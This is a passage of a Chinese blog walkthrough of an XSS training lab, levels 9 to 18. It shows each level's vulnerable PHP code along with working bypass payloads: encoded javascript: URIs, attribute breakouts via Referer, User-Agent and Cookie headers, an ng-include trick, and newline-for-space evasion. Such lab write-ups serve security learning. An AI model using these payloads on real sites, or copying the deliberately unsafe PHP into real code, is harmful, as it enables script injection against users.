class="go">javasc&amp;#114;&amp;#105;pt:alert(1)</code></pre><h3 id="Level-9-检测关键字"><a href="#Level-9-检测关键字" class="headerlink" title="Level 9 检测关键字"></a>Level 9 检测关键字</h3><p><img src="https://img-blog.csdnimg.cn/12c54040bbe1404a8719fd70a043305a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>上来看到和上关一样让输入链接，直接输入上题代码<code>javasc&amp;#114;&amp;#105;pt:alert(1)</code>，发现不行。</p><p>右键查看源码：<br><img src="https://img-blog.csdnimg.cn/415b472536fc4b5c824d00a50a0b1ebd.png"><br>发现 href 处只有一串 “您的链接不合法，有没有！”，到这里没啥头绪了，只能去看后台源码了。</p><h4 id="查看后台源码：-8"><a href="#查看后台源码：-8" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?phpif(false===strpos($str7,&#39;http://&#39;))&#123;  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;        &#125;else&#123;  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;&#125;?&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;&lt;?phpecho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt;</code></pre><p>发现和上关相比多了个strpos函数，这函数的意思是输入的字符串里面必须要有<code>http://</code>字符，我们给他加上，然后再注释掉，尝试</p><p>构造命令：</p><pre><code class="go">javasc&amp;#114;&amp;#105;pt:alert(1)//http://</code></pre><p><img src="https://img-blog.csdnimg.cn/fec69f1a9fe04bb38d1b5c832a2679ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>通关成功！🆗，下关。</p><h4 id="通关代码：-8"><a href="#通关代码：-8" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">javasc&amp;#114;&amp;#105;pt:alert(1)//http://</code></pre><h3 id="Level-10-隐藏信息"><a href="#Level-10-隐藏信息" class="headerlink" title="Level 10 隐藏信息"></a>Level 10 隐藏信息</h3><p><img src="https://img-blog.csdnimg.cn/8c8533af42f14354bfca59ed822445ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>来到这关发现输入框没了，只能在url栏输入，先用经典代码测试一下<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>：<br><img src="https://img-blog.csdnimg.cn/44c5a51bfd584326a31cfb48ae01dd63.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>显然不行，右键查看源码：<br><img src="https://img-blog.csdnimg.cn/d86b4cd8160d4f509f9ec9d822096a66.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到，显示位应该还是使用 htmlspecialchar 函数处理了，并且还看到了页面隐藏的三个输入框，现在不仅能给keyword传参，还能给三个input传参。</p><p>尝试给其余三个参数传参<br><img src="https://img-blog.csdnimg.cn/69d52722fa3543a48807dc610ea94db9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>右键查看源码：<br><img src="https://img-blog.csdnimg.cn/93b3b93d3f2344308c2d53d9bba13a21.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>发现只有 t_sort 接受了我们传的参数（双引号闭合），那也就是说可以从 t_sort 下手了，同时要想使用这个标签需要注释掉后面原有的 hidden 类型，把它改为其它类型，如 button 或 type 类型。</p><p>先测试一下，构造payload：</p><pre><code class="go">?keyword=1&amp;t_sort=1&quot; &lt;script&gt;alert(1)&lt;/script&gt; type=button &gt;//</code></pre><p>还是不行，右键查看源码发现过滤了<code>&lt; &gt;</code>那就使用 onclick 事件试一下。<br><img src="https://img-blog.csdnimg.cn/65c0e0edd1194216b4fe163bd4071b13.png"><br>构造payload（注释符可加可不加）：</p><pre><code class="go">?keyword=1&amp;t_sort=1&quot; onclick=&#39;javascript:alert(1)&#39; type=button &gt;//</code></pre><p><img src="https://img-blog.csdnimg.cn/16d5f8014d4e454f923995987e88d302.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>点一下按钮，成功过关！</p><h4 id="查看后台源码：-9"><a href="#查看后台源码：-9" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>观察代码，如我们料想的那样，str 被 htmlspecialchars 过滤了，也只有 t_sort 接受参数值，对 t_sort 的过滤只有左右尖括号，所以注入显得很容易。</p><p>看来作者目的是提醒我们注意隐藏框以及假输入框的存在。</p><h4 id="通关代码：-9"><a href="#通关代码：-9" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">?keyword=1&amp;t_sort=1&quot; onclick=&#39;javascript:alert(1)&#39; type=button &gt;//</code></pre><h3 id="Level-11-Referer信息"><a href="#Level-11-Referer信息" class="headerlink" title="Level 11 Referer信息"></a>Level 11 Referer信息</h3><p><img src="https://img-blog.csdnimg.cn/8b0c53e5e7dc4661a0c1e0360fae2518.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>看起来与上一关一样，直接右键查看源码：<br><img src="https://img-blog.csdnimg.cn/a627aedb49dd4cecac5e1922aed45469.png"><br>可以发现这关隐藏了四个输入框，值得注意的是，第四个隐藏输入框 t_ref 已经有了值，并且可以看出是第十关我们输入的payload。</p><p>尝试给 keyword 赋值测试 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/ec35d1fbccd04a95910a9efa3438e700.png"><br>显然不行，右键源码显示我们输入的代码应该是被 htmlspecialchars 函数转义了，那么再测试一下这四个隐藏的输入框哪个能传参。</p><pre><code class="go">?keyword=1&amp;t_link=2&amp;t_history=3&amp;t_sort=4&amp;t_ref=5</code></pre><p><img src="https://img-blog.csdnimg.cn/793bf2def62241358b3472285d2813e7.png"><br>可以看到又只有 t_sort 被赋值成功，同时 t_ref 的值没有了，尝试对 t_sort 的属性进行闭合。</p><pre><code class="go">?keyword=1&amp;t_sort=2&quot; onclick=&#39;javascript:alert(1)&#39; type=button &gt;//</code></pre><p><img src="https://img-blog.csdnimg.cn/e258934077b4416f911ddc97aef277cb.png"><br>发现 “引号” 和 “尖括号” 都被转义了，猜测还是 htmlspecialchars 函数过滤了 。如果双引号不能用，也就不能闭合标签去创造自己的事件，所以要另外想其他的办法。</p><p>前面我们还记得 t_ref 是第十关的 payload 网址，而 ref 又可能是 http 头中的 referer 属性，我们且可尝试一下抓包进行注入。<br><img src="https://img-blog.csdnimg.cn/04a896df8eb94424b268ad4cd713b133.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>修改 referer 属性，传入值为1<br><img src="https://img-blog.csdnimg.cn/673074bcbc044edbbadf528cf493bcff.png"><br>右键源码可以看到，t_ref 的值变为1了，那我们就可以从这入手。尝试闭合value值并创建自己的事件，构造payload：</p><pre><code class="php">Referer:1&quot;onclick=&#39;javascript:alert(1)&#39; type=button &gt;//</code></pre><p><img src="https://img-blog.csdnimg.cn/74a79f60c5554c948e4a7ccd985c6f94.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>放包，点击按钮即可过关！<br><img src="https://img-blog.csdnimg.cn/6cb21f714547484aba216f74551bf197.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h4 id="查看后台源码：-10"><a href="#查看后台源码：-10" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_REFERER&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>可以看到 keyword 进行了 htmlspecialchars 处理，t_sort 参数也被 htmlspecialchars 处理再次赋给value，接受 HTTP_Referer 头部参数进行了除尖括号处理，只要没有特殊字符转义，没有双引号去除，那么这个标签的属性就可能是危险的。</p><h4 id="通关代码：-10"><a href="#通关代码：-10" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">Referer:1&quot;onclick=&#39;javascript:alert(1)&#39; type=button &gt;//</code></pre><h3 id="Level-12-user-agent信息"><a href="#Level-12-user-agent信息" class="headerlink" title="Level 12 user-agent信息"></a>Level 12 user-agent信息</h3><p><img src="https://img-blog.csdnimg.cn/5f61584f29e640b3ab593193186187e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>直接右键看源码吧<br><img src="https://img-blog.csdnimg.cn/c6dbbe154ffb4b85ae2366b9ea22423b.png"><br>又发现四个隐藏框，其中第四个有点熟悉，t_ua 联想到 HTTP 请求头部的 User-Agent，猜测上一题是同类型的。</p><p>尝试构造paypoad：</p><pre><code class="go">User-Agent:1&quot; onclick=&#39;javascript:alert(1)&#39; type=button &gt; //</code></pre><p>抓包，修改 User-Agent 的值：<br><img src="https://img-blog.csdnimg.cn/26de018e663e45d785c0e01274904ae9.png"><br>放包，点击按钮即可通关！<br><img src="https://img-blog.csdnimg.cn/f31750761f384ad18a5c6d244715b468.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h4 id="查看后台源码：-11"><a href="#查看后台源码：-11" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>换汤不换药，意在让我们了解不同的注入位置，仍旧像上一关那样分析就行了。</p><h4 id="通关代码：-11"><a href="#通关代码：-11" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">User-Agent:1&quot; onclick=&#39;javascript:alert(1)&#39; type=button &gt; //</code></pre><h3 id="Level-13-cookie-信息"><a href="#Level-13-cookie-信息" class="headerlink" title="Level 13 cookie 信息"></a>Level 13 cookie 信息</h3><p><img src="https://img-blog.csdnimg.cn/799d9a9bed7e4b8a9b7c26c3f033264a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>右键查看源码：<br><img src="https://img-blog.csdnimg.cn/4a8230da90824ea780e7db16214eafbe.png"><br>看到参数 t_cook，猜测可能是 cookie，抓包，仍旧是相同的方式，在 cookie 处进行测试。<br><img src="https://img-blog.csdnimg.cn/eb5bf8a2fc0846c28eb0a6abbbd5c65d.png"><br>给 user 赋 cookie 值，构造payload（这次试试text）：</p><pre><code class="go">Cookie: 1&quot; onclick=&#39;javascript:alert(1)&#39; type=text &gt; //</code></pre><p><img src="https://img-blog.csdnimg.cn/4118a8ee52694b1fa114d643725d54da.png"><br>点击输入框，即可过关！<br><img src="https://img-blog.csdnimg.cn/4df683cfcb4447e9bdb2e27537d5d990.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h4 id="查看后台源码：-12"><a href="#查看后台源码：-12" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>可以看到设置了一个cookie，user : call me maybe?，keyword 和 t_sort 都经过 htmlspecialchars 函数处理，cookie 只有标签去除，没有其他过滤，一样的注入，同上。</p><h4 id="通关代码：-12"><a href="#通关代码：-12" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">Cookie: user=1&quot; onclick=&#39;javascript:alert(1)&#39; type=text &gt; //</code></pre><h3 id="Level-14-exif-xss"><a href="#Level-14-exif-xss" class="headerlink" title="Level 14 exif xss"></a>Level 14 exif xss</h3><p><img src="https://img-blog.csdnimg.cn/d8ceab6bb5c241999fd885dbeea0ce11.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>这关环境好像有问题，做不了。查了一下知道这题是 exif  xss 什么的<br><img src="https://img-blog.csdnimg.cn/276dd938c7b74a22a76a3e4b0b659926.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>想知道这关怎么做的可以看这篇文章：<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12">参考文章</a></p><h3 id="Level-15-ng-include-属性"><a href="#Level-15-ng-include-属性" class="headerlink" title="Level 15 ng-include 属性"></a>Level 15 ng-include 属性</h3><p><img src="https://img-blog.csdnimg.cn/3841e63516aa457a95fb20d0cd78765d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>右键查看源码：<br><img src="https://img-blog.csdnimg.cn/a83f741ceb774832bcf649ff751c78ec.png"><br>看到 src 的参数在这显示了，那就在这测试一下，测试 payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/4fc35ea844d54e198ddcbbbfc0873103.png"><br>特殊字符被转义了，估计没戏了，又看到 ng-include，不知道是啥，去百度查了一下，貌似跟 php 中的 include 函数类似，是将一个文件给包含进来。</p><p>ng-include的用法：</p><ol><li><p>ng-include 指令用于包含外部的 HTML文件。</p></li><li><p>包含的内容将作为指定元素的子节点。</p></li><li><p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p></li><li><p>默认情况下，包含的文件需要包含在<code>同一个</code>域名下。</p></li></ol><p>值得注意的是：</p><ol><li><p>如果单纯指定地址，必须要<code>加引号</code></p></li><li><p>加载外部html，script标签中的内容<code>不执行</code></p></li><li><p>加载外部html中含有style标签样式可以识别</p></li></ol><p>可以包含同一域名的 html 文件，那也就是说可以包含之前做过的有xss漏洞的文件，但是不能执行script中的代码，那就用新建标签吧</p><p>尝试构造代码：</p><pre><code class="html">?src=&#39;level1.php?name=&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;&#39;</code></pre><p><img src="https://img-blog.csdnimg.cn/5ff06ea6be74442488c976cdb5681e65.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>点击链接即可通关！或者使用下面这个更简单。</p><pre><code class="html">?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></pre><p><img src="https://img-blog.csdnimg.cn/63f5f08c3e2f45258316499e4ec7a106.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h4 id="查看后台源码：-13"><a href="#查看后台源码：-13" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;html ng-app&gt;&lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;script src=&quot;angular.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;window.alert = function()  &#123;     confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level16.php?keyword=test&quot;; &#125;&lt;/script&gt;&lt;title&gt;欢迎来到level15&lt;/title&gt;&lt;/head&gt;&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;?&gt;</code></pre><p>看到src参数经过了函数处理。</p><h4 id="通关代码：-13"><a href="#通关代码：-13" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="html">?src=&#39;level1.php?name=&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;&#39;</code></pre><p>or</p><pre><code class="html">?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></pre><h3 id="Level-16-空格实体转义"><a href="#Level-16-空格实体转义" class="headerlink" title="Level 16 空格实体转义"></a>Level 16 空格实体转义</h3><p><img src="https://img-blog.csdnimg.cn/5300e00d9b6c4623902dbfb677ea8b62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>输入测试代码 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/ab085cdbaa3b45db9977c17f7c135e1a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>发现 script 没了，右键看下源码：<br><img src="https://img-blog.csdnimg.cn/922d6ebc2ea14affa8be4a7c3d92ad61.png"><br>发现 script 和 “/” 被替换成了<code>&amp;nbsp;</code>(空白符)，那尝试一下不带 script 和 “/”的payload</p><pre><code class="php">&lt;img src=1 onerror=alert(1)&gt;</code></pre><p>并不行，右键源码：<br><img src="https://img-blog.csdnimg.cn/7b8d659b42d04bdebdd43ae11d0b21f7.png"><br>emm.. 貌似空格也被替换了，好吧，只能想办法使用其它的来代替空格了，想到在html里，换行是可以代替空格的。</p><pre><code class="html">&lt;imgsrc=1onerror=alert(1)&gt;</code></pre><p>使用URL编码将回车符转换为<code>%0d</code>（或换行符<code>%0a</code>）替代即可。</p><pre><code class="php">&lt;img%0dsrc=1%0donerror=alert(1)&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/e6f6071ed9ff464485b08353e50147f6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>成功弹窗！</p><h4 id="查看后台源码：-14"><a href="#查看后台源码：-14" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt;</code></pre><p>对关键字进行了空白实体替代。</p><h4 id="通关代码：-14"><a href="#通关代码：-14" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">?keyword=&lt;img%0dsrc=1%0donerror=alert(1)&gt;</code></pre><h3 id="Level-17-参数拼接"><a href="#Level-17-参数拼接" class="headerlink" title="Level 17 参数拼接"></a>Level 17 参数拼接</h3><p><img src="https://img-blog.csdnimg.cn/3c99dd4823a44fc3a3ae4ea6e0b50019.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>这题很简洁，图片都没有，点击链接也确实直接进入下一关了。</p><p>右键查看源码：<br><img src="https://img-blog.csdnimg.cn/e91c795366fe4863816ccd638504ae9b.png"><br>从 url 框看到是通过 arg01 和 arg02 两个参数进行传参，传参之后，对两个参数进行了拼接，那么是不是可以直接使用事件来触发呢？</p><p>构造payload（注意空格）：</p><pre><code class="php">?arg01= onmouseover&amp;arg02=alert(1) </code></pre><p>并没反应，右键查看源码：<br><img src="https://img-blog.csdnimg.cn/796c48eee49d4b0494fc960a84fa2450.png"><br>到这没啥思路了，查了一下，知道这里有个 swf 文件没有被加载出来。</p><blockquote><p>swf文件：即shockwave flash文件，能被flash player打开</p></blockquote><p>firefox加载出不来，换成Google，虽然图片还是出不来，但成功弹窗了!<br><img src="https://img-blog.csdnimg.cn/9358335c7aa346f487756a66ac79993e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>还可以构造这样的payload：</p><pre><code class="php">?arg01=a&amp;arg02=b onmouseover=alert(1)</code></pre><p><img src="https://img-blog.csdnimg.cn/e3a82eb4a7204b86bced57ef1addfa24.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>注意：由于本关加载不出图片无法点击，所以用不了 onclick 事件。</p><h4 id="查看后台源码：-15"><a href="#查看后台源码：-15" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt;</code></pre><p>并没有什么的过滤，直接构造事件。</p><h4 id="通关代码：-15"><a href="#通关代码：-15" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="php">?arg01= onmouseover&amp;arg02=alert(1) </code></pre><p>or</p><pre><code class="php">?arg01=a&amp;arg02=b onmouseover=alert(1)</code></pre><h3 id="Level-18-参数拼接"><a href="#Level-18-参数拼接" class="headerlink" title="Level 18 参数拼接"></a>Level 18 参数拼接</h3><p><img src="https://img-blog.csdnimg.cn/ec51083c6de44e679cb421936e30babd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_19,color_FFFFFF,t_70,g_se,x_16"><br>好家伙，更干净了，看到网页源码后，又有个swf，好吧，还是换google吧。<br><img src="https://img-blog.csdnimg.cn/b43c32f6571343e6ae634a24ab2ca28e.png"><br>看起来和上一关一样，直接输入上题代码</p><pre><code class="php">?arg01= onmouseover&amp;arg02=alert(1) </code></pre><p>woc，直接弹窗了，有点疑惑。<br><img src="https://img-blog.csdnimg.cn/08458508526c4aa7a874d778f8badcbf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>再测试一下这个，发现也行。</p><pre><code class="php">?arg01=a&amp;arg02=b onmouseover=alert(1)</code></pre><p><img src="https://img-blog.csdnimg.cn/31f11c373ca941a1af5af16338ef7e74.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h4 id="查看后台源码：-16"><a href="#查看后台源码：-16" class="headerlink" 